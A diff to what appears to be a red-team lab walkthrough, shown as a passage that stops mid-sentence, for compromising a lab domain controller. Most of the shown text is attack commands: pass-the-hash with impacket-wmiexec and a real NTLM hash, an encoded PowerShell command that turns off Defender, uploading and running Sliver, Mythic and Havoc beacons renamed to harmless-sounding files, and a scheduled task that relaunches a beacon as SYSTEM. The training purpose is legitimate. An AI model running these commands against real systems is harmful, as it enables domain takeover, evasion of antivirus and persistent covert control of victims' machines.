@@ -66,7 +66,7 @@ echo '10.1.132.39  DC01.shadow.gate shadow.gate DC01' | sudo tee -a /etc/hosts
 
 Success: nmap returns the domain controller's services (53, 88, 389, 445, 636, 5985 and the AD CS HTTP endpoint). The tunnel is carrying operator traffic.
 
-If it fails: nmap timing out means the tunnel is down. Recheck DEPLOY Step 18 (redirector isolation) and that `10.1.132.39` falls inside your `vpn_tunnel_cidrs`.
+If it fails: nmap timing out means the tunnel is down. Recheck DEPLOY Step 17 (reachability to the target) and that `10.1.132.39` falls inside your `vpn_tunnel_cidrs`.
 
 ---
 
@@ -83,36 +83,30 @@ On a domain controller, Domain Admin is local admin, which is what makes the del
 
 ## Phase 3: Deliver and land the Sliver beacon
 
-Five commands take you from the whitecarded hash to a beacon on the DC. The beacon calls back to the redirector public EIP over 443, the same path the CONFIG heartbeat proved.
+Four commands take you from the whitecarded hash to a beacon on the DC. The beacon calls back to the redirector public EIP over 443, the same path the CONFIG heartbeat proved. You reuse the Sliver implant already built in CONFIG (Step A3, `/tmp/sysProxy.exe` on the Sliver host, same `redstack` profile and callback), so there is no regenerate step here.
 
-1. Generate the implant, in `sliver-client` on the Sliver host. Garble obfuscation is on by default:
-
-```
-generate --http https://<REDIR_PUBLIC_IP>/cloud/storage/objects/ --os windows --arch amd64 --format exe --c2profile redstack --save /tmp/svc_pub.exe
-```
-
-2. Pull it to Kali, where the delivery tooling runs (lab password from `deployment_info`):
+1. Pull the CONFIG implant to Kali, where the delivery tooling runs (lab password from `deployment_info`):
 
 ```bash
-scp admin@sliver:/tmp/svc_pub.exe .
+scp admin@sliver:/tmp/sysProxy.exe .
 ```
 
-3. Disable Defender on the DC (pass-the-hash, `-nooutput` because AV deletes the wmiexec output file). The encoded command is `Set-MpPreference -DisableRealtimeMonitoring 1`:
+2. Disable Defender on the DC (pass-the-hash, `-nooutput` because AV deletes the wmiexec output file). The encoded command is `Set-MpPreference -DisableRealtimeMonitoring 1`:
 
 ```bash
 impacket-wmiexec -hashes :4366ec0f86e29be2a4a5e87a1ba922ec -nooutput shadow.gate/Administrator@10.1.132.39 'powershell -enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEA'
 ```
 
-4. Upload the beacon with smbmap (nxc times out on the 35 MB binary):
+3. Upload the beacon with smbmap (nxc times out on the 35 MB binary):
 
 ```bash
-smbmap -H 10.1.132.39 -d shadow.gate -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec' --upload ./svc_pub.exe 'C$/Windows/Temp/svc_pub.exe'
+smbmap -H 10.1.132.39 -d shadow.gate -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec' --upload ./sysProxy.exe 'C$/Windows/Temp/sysProxy.exe'
 ```
 
-5. Execute it:
+4. Execute it:
 
 ```bash
-impacket-wmiexec -hashes :4366ec0f86e29be2a4a5e87a1ba922ec -nooutput shadow.gate/Administrator@10.1.132.39 'C:\Windows\Temp\svc_pub.exe'
+impacket-wmiexec -hashes :4366ec0f86e29be2a4a5e87a1ba922ec -nooutput shadow.gate/Administrator@10.1.132.39 'C:\Windows\Temp\sysProxy.exe'
 ```
 
 Confirm the session in Sliver:
@@ -125,7 +119,7 @@ whoami
 
 Success: a new session from `10.1.132.39` registers and `whoami` returns `SHADOW\Administrator`. This is the beacon, separate from the Windows heartbeat.
 
-If it fails: watch the redirector for the callback (`sudo tail -f /var/log/apache2/redirector-ssl-access.log`, look for `/cloud/storage/objects/`). No hits means the implant is not executing or cannot reach the public EIP. A decoy 200 means a header or prefix mismatch. Confirm Defender was disabled (step 3 runs before step 4) and verify the upload landed with `smbmap -H 10.1.132.39 -d shadow.gate -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec' -r 'C$/Windows/Temp'`.
+If it fails: watch the redirector for the callback (`sudo tail -f /var/log/apache2/redirector-ssl-access.log`, look for `/cloud/storage/objects/`). No hits means the implant is not executing or cannot reach the public EIP. A decoy 200 means a header or prefix mismatch. Confirm Defender was disabled (step 2 runs before step 3) and verify the upload landed with `smbmap -H 10.1.132.39 -d shadow.gate -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec' -r 'C$/Windows/Temp'`.
 
 ---
 
@@ -135,18 +129,35 @@ With a foothold on the DC, stage the other two C2s through it instead of going b
 
 The Apollo and Havoc implants are the CONFIG builds (Phase B and C), pointed at the redirector public EIP on 443, so their callbacks work on the DC unchanged. Push them from the Windows operator (where CONFIG left them) to the Sliver host. Windows Server 2022 ships the OpenSSH client:
 
-```
-scp C:\Users\Administrator\Desktop\apolloTest.exe admin@sliver:/tmp/
-scp C:\Users\Administrator\Desktop\demon.x64.exe admin@sliver:/tmp/
+These are the CONFIG builds (`msDiag.exe` from Phase B, `hlpUpdate.exe` from Phase C). Push each one at a time:
+
+```powershell
+scp C:\Users\Administrator\Desktop\msDiag.exe admin@sliver:/tmp/
 ```
 
-Adjust the paths to wherever your CONFIG builds landed. In sliver-client, select the Administrator session, upload both to the DC, and execute. Use forward slashes on the upload target, and no `-o` on execute (with `-o` it blocks on a beacon that never returns):
+```powershell
+scp C:\Users\Administrator\Desktop\hlpUpdate.exe admin@sliver:/tmp/
+```
+
+Adjust the paths to wherever your CONFIG builds landed. In sliver-client, select the Administrator session, then upload both to the DC and execute. Run these one at a time, not as a block: Sliver errors on pasted multi-command input. Use forward slashes on the upload target, and no `-o` on execute (with `-o` it blocks on a beacon that never returns):
 
 ```text
 use [ADMIN_SESSION_ID]
-upload /tmp/apolloTest.exe C:/Windows/Temp/my.exe
-upload /tmp/demon.x64.exe C:/Windows/Temp/hv.exe
+```
+
+```text
+upload /tmp/msDiag.exe C:/Windows/Temp/my.exe
+```
+
+```text
+upload /tmp/hlpUpdate.exe C:/Windows/Temp/hv.exe
+```
+
+```text
 execute C:\\Windows\\Temp\\my.exe
+```
+
+```text
 execute C:\\Windows\\Temp\\hv.exe
 ```
 
@@ -163,11 +174,14 @@ Do not use `getsystem` here. Sliver's `getsystem` spawns a new SYSTEM implant th
 From the Administrator beacon, create and run the task. Sliver's `execute` treats `\` as an escape, so double the backslashes in the path or it lands mangled:
 
 ```text
-execute -o schtasks.exe /create /tn svcpub /tr C:\\Windows\\Temp\\svc_pub.exe /sc once /st 00:00 /ru SYSTEM /f
+execute -o schtasks.exe /create /tn svcpub /tr C:\\Windows\\Temp\\sysProxy.exe /sc once /st 00:00 /ru SYSTEM /f
+```
+
+```text
 execute -o schtasks.exe /run /tn svcpub
 ```
 
-Check the `Execute:` echo shows `C:\Windows\Temp\svc_pub.exe` with single backslashes. The `/ST earlier than current time` warning is harmless since `/run` triggers it manually.
+Check the `Execute:` echo shows `C:\Windows\Temp\sysProxy.exe` with single backslashes. The `/ST earlier than current time` warning is harmless since `/run` triggers it manually.
 
 A new session registers within a callback interval. In the session list it shows as `SHADOW\DC01$` (a LocalSystem process presents the machine account over the network), but the local token is SYSTEM. Confirm:
 
@@ -235,4 +249,4 @@ Also disconnect the HSL side and confirm your CloudWatch billing alarm cleared.
 
 ## Where this ends
 
-ShadowGate under SYSTEM via a Sliver beacon that traversed the redirector, with Mythic and Havoc beacons staged through that same foothold and their SYSTEM step left to the attendee, then a clean teardown. That is the full boot-to-breach arc: DEPLOY stood up the platform, CONFIG proved all three callback paths, ATTACK used all three against a live target.
+ShadowGate under SYSTEM via a Sliver beacon that traversed the redirector, with Mythic and Havoc beacons staged through th
